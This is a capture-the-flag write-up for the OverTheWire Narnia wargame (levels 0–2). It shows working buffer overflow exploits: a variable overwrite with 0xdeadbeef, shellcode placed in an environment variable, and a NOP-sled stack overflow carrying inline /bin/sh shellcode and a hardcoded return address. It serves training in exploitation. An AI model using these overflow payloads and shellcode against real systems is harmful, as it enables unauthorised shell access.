# Binary Exploitation/Pwn challenges from OverTheWire

## Narnia0

We have a `char buf[20]` buffer, but the input is taken as `scanf("%24s",&buf);` and we know that the shell is only executed when the val is at **0xdeadbeef**.

We build the hex address: "\xef\xbe\xad\xde" and with `cat -` we hold the shell open:

```bash
(python -c 'print("A"*20+"\xef\xbe\xad\xde")'; cat -; ) | ./narnia0
```

## Narnia1

This time the code reads from the `env` the variable. We have to set EGG as a shellcode.
We can pick any shellcode from [here](https://www.exploit-db.com/shellcodes):  

```bash
export EGG=`python -c 'print "<shellcode>"'`

./narnia1
```

## Narnia2

The buffer is `char buf[128]` and the function we will exploit will be `strcpy(buf,argv[1]);`.
In order to see where is the range of address we can fall in using a **NOP-Sled**, first of all we have to fill the buffer with 128 "A", inside GDB.
Note the breakpoint at *strcpy*

`gdb narnia2`

```bash
b strcpy
run $(python -c 'print 128 * "A" + "BBBB"+ "CCCC"') #where B is the $ebp and C is the ret address
x/700xw $esp #analyzing the stack to detect "AAAA" B(41414141)
```

With GDB we see that in the stack we have "CCCC" in the **return address** of strcpy, then here we will put our middle-address of the  **NOP-Sled**. Again, any [shellcode](https://www.exploit-db.com/shellcodes/47513) can be used if it is small enough to fit into the NOPs.

`shellcode="\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"`

`return address="\x4c\xd8\xff\xff"`

Number of NOPs = **128**(buff) - **25**(shellcode) + **4**($ebp) = 107

Let's run the program with:

```bash
./narnia2 $(python -c 'print 107 * "\x90" + "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"+"\x4c\xd8\xff\xff"')
```



